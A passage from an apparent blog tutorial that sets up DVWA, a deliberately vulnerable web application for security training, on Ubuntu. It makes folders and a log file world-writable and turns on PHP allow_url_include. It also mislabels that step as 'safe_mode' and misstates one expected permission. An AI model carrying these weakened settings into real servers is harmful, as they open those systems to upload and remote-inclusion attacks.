drwxr-xr-x  5 root root  4096 Jul 11 12:58 hackable
-rw-r--r--  1 root root   895 Jul 11 12:58 ids_log.php
-rw-r--r--  1 root root  4396 Jul 11 12:58 index.php
-rw-r--r--  1 root root  1869 Jul 11 12:58 instructions.php
-rw-r--r--  1 root root  4163 Jul 11 12:58 login.php
-rw-r--r--  1 root root   414 Jul 11 12:58 logout.php
-rw-r--r--  1 root root   199 Jul 11 12:58 phpinfo.php
-rw-r--r--  1 root root   148 Jul 11 12:58 php.ini
-rw-r--r--  1 root root  9180 Jul 11 12:58 README.md
-rw-r--r--  1 root root    26 Jul 11 12:58 robots.txt
-rw-r--r--  1 root root  4724 Jul 11 12:58 security.php
-rw-r--r--  1 root root  2931 Jul 11 12:58 setup.php
drwxr-xr-x 14 root root  4096 Jul 11 12:58 vulnerabilities&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Once everything is looking good, copy the default DVWA config file so that it is usable by DVWA (Note: make sure you are in the &lt;code class=&quot;language-text&quot;&gt;/var/www/html&lt;/code&gt; directory when executing this command). The file &lt;code class=&quot;language-text&quot;&gt;config/config.inc.php.dist&lt;/code&gt; is provided as an example, but we will configure our system to match the configuration in this file. So no editing of this file is required.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo cp config/config.inc.php.dist config/config.inc.php&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now would be a good time to view the DVWA web page to see if everything is working correctly. If you are using Ubuntu Desktop this process is very straight-forward. Open a web browser - Firefox is installed by default. Navigate to the following URL:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;127.0.0.1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you are on Ubuntu Server, you cannot perform this task locally. You will need to have another computer, or virtual machine, on the same network. Check your IP address using:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;ip a&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Open a web browser on another computer in the same network, and enter the IP address that appeared for your network adapter in the URL.&lt;/p&gt;
&lt;p&gt;When you load DVWA for the first time, you will be presented with the setup page. This page displays the current configuration, and any errors that may be present. The page contains decent information on how to fix these problems too. Also, at the bottom of the page is a button to create the database for DVWA. We will use this in the future after we have finished configuring DVWA. For reference, my &lt;code class=&quot;language-text&quot;&gt;setup.php&lt;/code&gt; page is displayed below:&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/c8a9619cc6876afc561e732ba196e68a/97bfd/setup-page.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 86.70886075949367%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAACnklEQVQ4y51Uy1ITQRTNn7iwSoIlhIf8ilVutcryM3ChFhLIXhciaOkXuFALSwMFKEQeMkMyr8x7ksz7EZbH251gWGikXJy53X27z5wz9/aU0iRBvb6FxcVHWFp6huXlKqrVVVSXGVawslLD2st1bLx+hVqtxtd4fohVyj95/BS7u3sIggClNM2wvrGG8uR13F6YxdxcBdOzZczM30SF4vzCFO49uIv7D+/QWhm3KhOYnpnA1MwgVmYncaN8DW/fvQHjKnleB6p+hs+NdXzcf45PjRc4EfZQ397Ezrcv2NrZxPfGNlryT8iqAEUTIWsCH3PQWFJPYVo6XNdFiT0c18Zm/T229z/g4PQrfN+H1FIIMlpNCYqswjJtmAyGBUM3OXw/REDIsoLshrBtGyXHcdDpdOiAA8fuwnN6CMMQhmFwWJYNXTegqhpUTYOiKBxs3fU8TpQkKbrdLhgXJ2SKzs/7KIocfYpB4OP4+ASCKPKN/X6foygKQp8jz4shco5erzciZBO2mGUZjxEp1EiNLMtkW+JKmGqW/xOuRMjIFIkIFQnNpgC/O9ozQH41QmaLzY8Oj3B4+ANHp8doiQ2EPQ85Wb0guEz+T0Jmr3nWhNgUIeoiekmANM/+zzIjZEUSBAEiFcWlPi36VIy84Lm8GBXi8mca/w2jiLdJW5IQtNuI4pirZlcrpjZJ05QjY7gqoWma0FQVBlW7TaSDcRvd4f6AXBT0okErFWMIKZmQmi5V2Gzr0KipdWpwnYhdy+ItxG4EO8dUM8REPJYwpk2eoiIigtBxBwdJdTC0HfgBj2EQ8nEUxeMtp+yNpMzXdfhk3ae8P7TJCsYjmxMpO5skMV//K2FC/0jdtKCQZYPubEpNnFLud0yzUUwHTX6h8BfLGb6jktL8cQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;The setup page provided by DVWA&quot;
        title=&quot;The setup page provided by DVWA&quot;
        src=&quot;/static/c8a9619cc6876afc561e732ba196e68a/f058b/setup-page.png&quot;
        srcset=&quot;/static/c8a9619cc6876afc561e732ba196e68a/c26ae/setup-page.png 158w,
/static/c8a9619cc6876afc561e732ba196e68a/6bdcf/setup-page.png 315w,
/static/c8a9619cc6876afc561e732ba196e68a/f058b/setup-page.png 630w,
/static/c8a9619cc6876afc561e732ba196e68a/40601/setup-page.png 945w,
/static/c8a9619cc6876afc561e732ba196e68a/97bfd/setup-page.png 1078w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;As you can see there are a few issues with the installation at the moment. We will fix these in the next section.&lt;/p&gt;
&lt;h2 id=&quot;configuring-dvwa&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#configuring-dvwa&quot; aria-label=&quot;configuring dvwa permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configuring DVWA&lt;/h2&gt;
&lt;p&gt;The &lt;a href=&quot;https://github.com/ethicalhack3r/DVWA/blob/master/README.md&quot;&gt;README file&lt;/a&gt; provided by the DVWA authors does summarize a few configuration issues that may be encountered during installation. Most of these issues are currently apparent in our installation too. So we will go ahead and fix these. Without making sure these issues are resolved, the DVWA web application will not function as desired and some exercises will not work correctly. The following list documents the issues we will fix:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Writable folder &lt;code class=&quot;language-text&quot;&gt;hackable/uploads/&lt;/code&gt;: No&lt;/li&gt;
&lt;li&gt;Writable file &lt;code class=&quot;language-text&quot;&gt;phpids_log.txt&lt;/code&gt;: No&lt;/li&gt;
&lt;li&gt;Writable folder &lt;code class=&quot;language-text&quot;&gt;config/&lt;/code&gt;: No&lt;/li&gt;
&lt;li&gt;PHP function &lt;code class=&quot;language-text&quot;&gt;allow_url_include&lt;/code&gt;: Disabled&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first three issues are all related to directory permissions. We will fix these first. At any time, feel free to reload the DVWA setup page in your browser to check if the issue has been solved. When resolved the issue will turn from red to green.&lt;/p&gt;
&lt;h4 id=&quot;permissions-uploads-folder&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#permissions-uploads-folder&quot; aria-label=&quot;permissions uploads folder permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Permissions: &lt;code class=&quot;language-text&quot;&gt;uploads&lt;/code&gt; folder&lt;/h4&gt;
&lt;p&gt;The &lt;code class=&quot;language-text&quot;&gt;hackable/uploads/&lt;/code&gt; folder needs write permissions for the root account. First, check the permissions by listing the directory that the folder is contained in:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;student@ubuntu:/var/www/html$ ls -la /var/www/html/hackable/
total 20
drwxr-xr-x 5 root root 4096 Jul  9 17:41 .
drwxr-xr-x 8 root root 4096 Jul  9 17:43 ..
drwxr-xr-x 2 root root 4096 Jul  9 17:41 flags
drwxr-xr-x 2 root root 4096 Jul  9 17:41 uploads
drwxr-xr-x 2 root root 4096 Jul  9 17:41 users&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I am unsure why DVWA is complaining because the folder is owned by the root user already and has write permissions. Nevertheless, by specifying the &lt;em&gt;other&lt;/em&gt; value in the permission set is configured for write permissions solves this problem. The current permissions set is: &lt;code class=&quot;language-text&quot;&gt;rwxr-xr-x&lt;/code&gt; or &lt;code class=&quot;language-text&quot;&gt;755&lt;/code&gt;. Simply, allow the &lt;em&gt;other&lt;/em&gt; value to have write permission using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo chmod 757 /var/www/html/hackable/uploads/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can check the permission set has been updated by listing the directory again and viewing the permissions for the &lt;code class=&quot;language-text&quot;&gt;uploads&lt;/code&gt; folder which should now read: &lt;code class=&quot;language-text&quot;&gt;rwxr-xrwx&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;student@ubuntu:/var/www/html$ ls -la /var/www/html/hackable/
total 20
drwxr-xr-x 5 root root 4096 Jul  9 17:41 .
drwxr-xr-x 8 root root 4096 Jul  9 17:43 ..
drwxr-xr-x 2 root root 4096 Jul  9 17:41 flags
drwxr-xrwx 2 root root 4096 Jul  9 17:41 uploads
drwxr-xr-x 2 root root 4096 Jul  9 17:41 users&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;permissions-phpids_logtxt-file&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#permissions-phpids_logtxt-file&quot; aria-label=&quot;permissions phpids_logtxt file permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Permissions: &lt;code class=&quot;language-text&quot;&gt;phpids_log.txt&lt;/code&gt; file&lt;/h4&gt;
&lt;p&gt;The &lt;code class=&quot;language-text&quot;&gt;phpids_log.txt&lt;/code&gt; file also needs write permissions for the root account. First, check the permissions by listing the directory that the folder is contained in:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;student@ubuntu:/var/www/html$ ls -la /var/www/html/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt
-rw-r--r-- 1 root root 319 Jul  9 17:41 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The current permissions set for the file is: &lt;code class=&quot;language-text&quot;&gt;rw-r--r--&lt;/code&gt; or &lt;code class=&quot;language-text&quot;&gt;644&lt;/code&gt;. The file requires write access by the root user, however, setting this does not work (similar to the issue in the section above). Therefore, we will set the &lt;em&gt;other&lt;/em&gt; value to have write permission using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo chmod 646 /var/www/html/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can check the permission set has been updated by listing the directory again and viewing the permissions for the &lt;code class=&quot;language-text&quot;&gt;phpids_log.txt&lt;/code&gt; file which should now read: &lt;code class=&quot;language-text&quot;&gt;rwxr-xrwx&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;student@ubuntu:/var/www/html$ ls -la /var/www/html/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt
-rw-r--rw- 1 root root 319 Jul  9 17:41 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;permissions-config-folder&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#permissions-config-folder&quot; aria-label=&quot;permissions config folder permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Permissions: &lt;code class=&quot;language-text&quot;&gt;config&lt;/code&gt; folder&lt;/h4&gt;
&lt;p&gt;The &lt;code class=&quot;language-text&quot;&gt;config&lt;/code&gt; folder also needs write permissions for the root account. First, check the permissions by listing the directory that the folder is contained in:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;student@ubuntu:/var/www/html$ ls -la /var/www/html/ | grep config
drwxr-xr-x  2 root root  4096 Jul 11 13:00 config&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The current permissions set for the file is: &lt;code class=&quot;language-text&quot;&gt;rwxr-xr-x&lt;/code&gt; or &lt;code class=&quot;language-text&quot;&gt;755&lt;/code&gt;. The file requires write access by the root user, however, setting this does not work (similar to the issues in the sections above). Therefore, we will set the &lt;em&gt;other&lt;/em&gt; value to have write permission using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo chmod 757 /var/www/html/config&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can check the permission set has been updated by listing the directory again and viewing the permissions for the &lt;code class=&quot;language-text&quot;&gt;config&lt;/code&gt; folder which should now read: &lt;code class=&quot;language-text&quot;&gt;rwxr-xrwx&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;student@ubuntu:/var/www/html$ ls -la /var/www/html/ | grep config
drwxr-xrwx  2 root root  4096 Jul 11 13:00 config&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;enabling-php-function-safe_mode&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#enabling-php-function-safe_mode&quot; aria-label=&quot;enabling php function safe_mode permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Enabling PHP &lt;code class=&quot;language-text&quot;&gt;function safe_mode&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;The final issue we need to resolve is to set the PHP &lt;code class=&quot;language-text&quot;&gt;function safe_mode&lt;/code&gt; configuration to enabled. This is a configuration option for the PHP installation, so we need to modify the PHP configuration file, then restart the service. &lt;/p&gt;
&lt;p&gt;Open the &lt;code class=&quot;language-text&quot;&gt;php.ini&lt;/code&gt; file. Please note, that if you have a different PHP version that &lt;code class=&quot;language-text&quot;&gt;7.2&lt;/code&gt; you might need to change the path provided below. Feel free to use another text editor if you are not used to &lt;code class=&quot;language-text&quot;&gt;vi&lt;/code&gt;; for example, &lt;code class=&quot;language-text&quot;&gt;nano&lt;/code&gt; or &lt;code class=&quot;language-text&quot;&gt;gedit&lt;/code&gt; (if you are on Ubuntu Desktop).&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;sudo vi /etc/php/7.2/apache2/php.ini&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The setting is quite a long way down in the file. For the PHP version I was using, the configuration was on line 840. I would recommend using the &lt;em&gt;find&lt;/em&gt; tool in &lt;code class=&quot;language-text&quot;&gt;vi&lt;/code&gt; or your text editor of choice, and search for the following text: &lt;code class=&quot;language-text&quot;&gt;allow_url_include&lt;/code&gt;. You should find a block of text, as displayed below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;; Whether to allow include/require to open URLs (like http:// or ftp://) as files.
; http://php.net/allow-url-include
allow_url_include = Off&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;All you need to do is set the configuration to &lt;code class=&quot;language-text&quot;&gt;On&lt;/code&gt;, so it looks like the code below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;; Whether to allow include/require to open URLs (like http:// or ftp://) as files.
; http://php.net/allow-url-include
allow_url_include = On&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, restart the Apache service, so that the configuration is enabled:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo systemctl restart apache2&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;checking-the-dvwa-configuration&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#checking-the-dvwa-configuration&quot; aria-label=&quot;checking the dvwa configuration permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Checking the DVWA configuration&lt;/h4&gt;
&lt;p&gt;It is recommended to re-check the setup page provided by DVWA again to ensure that the configurations we just set have worked correctly. The issues that were present before should be resolved.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f87b6379c6553c2e9f1587a7b44c004c/cf4cc/setup-page-configured.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 81.64556962025317%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAChElEQVQ4y41Uy27TUBDth4BapKqBQgsrxAfwA2xYsWbBEgm+o2yQSNxWiA2gCrFqAYkCUlUilaStShI/4jhx/E7s+BWH3WHGSfpAKu3iZCZ35p7M8RlnJooibG5uYWXlBV4ViyiVBAilVYqrKBYFrK+/xsbGB7x7/xaCsJrXjiGs5X1CaQ1aS4Pv+5hJkgTPnj/F7NwVLC/fwuJiAYXFa7i5NI/CjTncvXcbj588woOH9zFfuIoFOlu4PjsG5Xy2dKeAX5W9MaHr9HAklvG5LGCr/BLblTfYq+xi+/sn7Oxu49uPL6ge/kRDOkRdPECd4wSNCTg3jC5s22ZCF1pHwdedj9jd30StWUbgDyBJClS1BUVuoqsbcN0eXMfLYVtOHsMwQhTGGGV/4HkeLMvCDLNyQ0czYXb5gp8X1aaKlqah0+mg2WxClhX6ERmiKEGUJOh6F4Zpot/vYzAYwHGcMaFpWvlBNsqQpglGFG0q1Gp1IlIRxTHVRsiyDENCNsFwOMyREpIkPSHkjyAIiCwFG8RNPGGL5SoK2lo7n4K3gev/Ip3E/xK6rpuTqYoKURYhKhI915OeMcb59OxcQpZjGiaqlSqq+1Uc1A5wpP9GlETHPRxP5xdO6JBRjXoDdbkG2ZARRMFZmacmvdSE1sQUdjUIBmMD0okJZ2RfckLP9dAkU3Raj5DqITnNm8B9URydkZxcZApHdpX3rE3vp057yE5rvJN6B7Zro+f10Pf7iNP4eOrzCalhQC47sgyt3UaL0OZIhKZlwqK9NQwjJ+B7jDAM8804V7JPzS4RhHQxoFeT5U4lM/hPYJpfSMgTRiTH13UE3S58cpwJpiTT/PT3mJ7xlPAvVH9z4FfEFdAAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;The setup page provided by DVWA&quot;
        title=&quot;The setup page provided by DVWA&quot;
        src=&quot;/static/f87b6379c6553c2e9f1587a7b44c004c/f058b/setup-page-configured.png&quot;
        srcset=&quot;/static/f87b6379c6553c2e9f1587a7b44c004c/c26ae/setup-page-configured.png 158w,
/static/f87b6379c6553c2e9f1587a7b44c004c/6bdcf/setup-page-configured.png 315w,
/static/f87b6379c6553c2e9f1587a7b44c004c/f058b/setup-page-configured.png 630w,
/static/f87b6379c6553c2e9f1587a7b44c004c/40601/setup-page-configured.png 945w,
/static/f87b6379c6553c2e9f1587a7b44c004c/cf4cc/setup-page-configured.png 1079w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;One step we will not configure is to set the &lt;em&gt;reCAPTCHA key&lt;/em&gt;. This configuration requires that you generate your own reCAPTCHA provided by Google and is beyond the scope of this post. Check the DVWA documentation for more information if you want to configure this setting and make the reCAPTCHA exercise available.&lt;/p&gt;
&lt;p&gt;There is one last set to perform, creating the database for DVWA. This step is exceptionally important, as, without the database, the DVWA exercises will not function correctly. The database connection can be problematic, and ease of setup depends on the version of MySQL you are using.&lt;/p&gt;
&lt;p&gt;Try to create the database by clicking the &lt;strong&gt;Create / Reset Database&lt;/strong&gt; button on the DVWA setup page. You will be presented with output at the bottom of the page that specifies any errors. If you are following this tutorial, and are using MySQL version 5.7, you will get the following error message.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 395px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/2ab8f38a8a8e14f6a82e62ac8bdd078e/2cb6c/database-issue.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
